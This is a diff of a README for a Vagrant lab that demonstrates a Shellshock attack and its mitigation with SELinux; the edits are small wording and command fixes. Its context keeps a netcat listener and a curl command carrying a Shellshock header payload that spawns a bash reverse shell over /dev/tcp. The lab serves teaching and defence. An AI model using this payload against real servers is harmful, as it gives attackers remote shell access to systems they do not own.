@@ -28,6 +28,7 @@ In order to make it possible to use this demo, you should first provision your e
 
 ```bash
 $ git clone https://github.com/fabiogoma/selinux-shellshock
+$ cd selinux-shellshock
 $ vagrant up
 Bringing machine 'shellshock' up with 'libvirt' provider...
 ==> shellshock: Creating image (snapshot of base box volume).
@@ -73,7 +74,7 @@ After provisioning your environment, you should be able to check a web page host
 Hacking
 -------
 
-Let's now open two terminals and execute a hack
+Let's now open two terminals and execute a hack.
 
 On your first terminal, using the netcat tool (nc) initiate a socket listener on port 9999 with some verbosity:
 
@@ -86,7 +87,7 @@ Ncat: Listening on :::9999
 Ncat: Listening on 0.0.0.0:9999
 ```
 
-Open a second terminal now and using curl, tell your http server to initiate a remote session on your local server listening on port 9999:
+Open a second terminal and now using curl, tell your http server to initiate a remote session on your local server listening on port 9999:
 
 ```bash
 $ curl -k -H 'x: () { :;}; /bin/bash -i >& /dev/tcp/192.168.122.1/9999 0>&1' http://shellshock.local/cgi-bin/script
@@ -153,7 +154,7 @@ Protecting your system
 Now let's start over by executing the provisioner again to return all configuration to the initial state
 
 ```bash
-$ $ vagrant up --provision
+$ vagrant up --provision
 Bringing machine 'shellshock' up with 'libvirt' provider...
 ==> shellshock: Running provisioner: ansible...
     shellshock: Running ansible-playbook...
